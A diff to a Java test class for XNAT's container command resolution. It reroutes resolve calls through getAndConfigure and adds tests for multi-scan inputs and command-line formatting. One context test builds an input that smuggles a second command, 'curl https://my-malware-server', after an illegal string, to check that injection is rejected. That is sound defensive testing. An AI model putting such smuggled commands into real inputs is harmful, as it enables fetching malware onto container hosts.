@@ -30,6 +30,7 @@ import org.nrg.containers.model.command.auto.ResolvedCommand;
 import org.nrg.containers.model.command.auto.ResolvedCommandMount;
 import org.nrg.containers.model.command.auto.ResolvedInputTreeNode;
 import org.nrg.containers.model.command.auto.ResolvedInputValue;
+import org.nrg.containers.model.command.entity.CommandInputEntity;
 import org.nrg.containers.model.command.entity.CommandType;
 import org.nrg.containers.model.configuration.CommandConfiguration;
 import org.nrg.containers.model.configuration.CommandConfiguration.CommandInputConfiguration;
@@ -57,14 +58,10 @@ import org.springframework.transaction.annotation.Transactional;
 
 import java.io.File;
 import java.nio.file.Paths;
-import java.util.Collections;
-import java.util.HashSet;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
+import java.util.stream.Collectors;
 
-import static org.hamcrest.Matchers.contains;
 import static org.hamcrest.Matchers.containsInAnyOrder;
-import static org.hamcrest.Matchers.hasEntry;
 import static org.hamcrest.Matchers.hasSize;
 import static org.hamcrest.Matchers.is;
 import static org.hamcrest.Matchers.not;
@@ -137,7 +134,8 @@ public class CommandResolutionTest {
         buildDir = folder.newFolder().getAbsolutePath();
         when(mockSiteConfigPreferences.getBuildPath()).thenReturn(buildDir);
 
-        dockerService.setServer(DockerServerBase.DockerServer.create(0L, "test", "unix:///var/run/docker.sock", null, false, pathTranslationXnatPrefix, pathTranslationContainerHostPrefix, false, null));
+        dockerService.setServer(DockerServerBase.DockerServer.create(0L, "test", "unix:///var/run/docker.sock", null,
+                false, pathTranslationXnatPrefix, pathTranslationContainerHostPrefix, false, null, null));
     }
 
     @Test
@@ -275,7 +273,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -313,7 +311,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -343,7 +341,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -374,7 +372,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -404,7 +402,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -492,6 +490,37 @@ public class CommandResolutionTest {
     //     assertThat(inputValues, hasEntry(projectInputName, projectUri));
     // }
 
+
+    @Test
+    public void testSessionScanMultiple() throws Exception {
+        final String commandWrapperName = "session-scan-mult";
+        final String inputPath = resourceDir + "/testSessionScanMult/session.json";
+
+        final Session session = mapper.readValue(new File(inputPath), Session.class);
+        final Map<String, String> runtimeValues = Maps.newHashMap();
+        runtimeValues.put("session", mapper.writeValueAsString(session));
+
+        // xnat wrapper inputs
+        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
+        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getExternalWrapperInputValue()));
+        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
+        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan",
+                session.getScans().stream().map(Scan::getDerivedWrapperInputValue).collect(Collectors.joining(", "))));
+
+        // command inputs
+        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
+        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever",
+                session.getScans().stream().map(Scan::getId).collect(Collectors.joining(" "))));
+        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));
+
+        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
+        assertThat(commandWrapper, is(not(nullValue())));
+
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
+        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
+                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
+    }
+
     private void assertStuffAboutResolvedCommand(final ResolvedCommand resolvedCommand,
                                                  final Command dummyCommand,
                                                  final CommandWrapper commandWrapper,
@@ -532,7 +561,7 @@ public class CommandResolutionTest {
         filledRuntimeValues.put("REQUIRED_WITH_FLAG", "foo");
         filledRuntimeValues.put("REQUIRED_NO_FLAG", "bar");
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(blankWrapper.id(), filledRuntimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), filledRuntimeValues, mockUser);
         assertThat(resolvedCommand.commandInputValues(),
                 containsInAnyOrder(
                         ResolvedCommand.ResolvedCommandInput.command("REQUIRED_WITH_FLAG", "foo"),
@@ -545,11 +574,48 @@ public class CommandResolutionTest {
 
         try {
             final Map<String, String> blankRuntimeValues = Maps.newHashMap();  // Empty map
-            commandResolutionService.resolve(blankWrapper.id(), blankRuntimeValues, mockUser);
+            commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), blankRuntimeValues, mockUser);
             fail("Command resolution should have failed with missing required parameters.");
         } catch (CommandResolutionException e) {
             assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
         }
+    }
+
+    @Test
+    public void testMultiParamCommandLine() throws Exception {
+        final String commandJsonFile = resourceDir + "/multi-command.json";
+        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
+        final Command command = commandService.create(tempCommand);
+
+        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
+        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
+            commandWrappers.put(commandWrapper.name(), commandWrapper);
+        }
+        final CommandWrapper wrapper = commandWrappers.get("multiple");
+
+        final String inputPath = resourceDir + "/testSessionScanMult/session.json";
+        final Session session = mapper.readValue(new File(inputPath), Session.class);
+        final Map<String, String> runtimeValues = Maps.newHashMap();
+        runtimeValues.put("session", mapper.writeValueAsString(session));
+        List<String> scanIds = session.getScans().stream().map(Scan::getId).collect(Collectors.toList());
+        String spacedScanIds = String.join(" ", scanIds);
+
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);
+        assertThat(resolvedCommand.commandInputValues(),
+                containsInAnyOrder(
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG1", spacedScanIds),
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG2", spacedScanIds),
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_QSPACE", spacedScanIds),
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_COMMA", spacedScanIds),
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_SPACE", spacedScanIds),
+                        ResolvedCommand.ResolvedCommandInput.command("MULTI_DEFAULT", spacedScanIds)
+
+                )
+        );
+
+        String cmdLine = "echo --flag=scan1 --flag=scan2 --flag scan1 --flag scan2 'scan1 scan2' " +
+                "scan1,scan2 scan1 scan2 scan1 scan2";
+        assertThat(resolvedCommand.commandLine(), is(cmdLine));
     }
 
     @Test
@@ -573,7 +639,7 @@ public class CommandResolutionTest {
             runtimeValues.put(inputName, "foo " + illegalString + " curl https://my-malware-server");
 
             try {
-                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(identityWrapper.id(), runtimeValues, mockUser);
+                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(identityWrapper.id()), runtimeValues, mockUser);
                 fail("Command resolution should have failed because of the illegal string.");
             } catch (IllegalInputException e) {
                 assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
@@ -665,7 +731,7 @@ public class CommandResolutionTest {
         final String resourceInputJson = mapper.writeValueAsString(resourceInput);
 
         final Map<String, String> runtimeValues = Collections.singletonMap("resource", resourceInputJson);
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
 
         assertThat(resolvedCommand.mounts(), hasSize(1));
         final ResolvedCommandMount resolvedCommandMount = resolvedCommand.mounts().get(0);
@@ -727,7 +793,7 @@ public class CommandResolutionTest {
         final Map<String, String> runtimeValues = Maps.newHashMap();
         runtimeValues.put("resource", resourceRuntimeJson);
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(wrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);
 
         assertThat(resolvedCommand.mounts(), Matchers.<ResolvedCommandMount>hasSize(1));
 
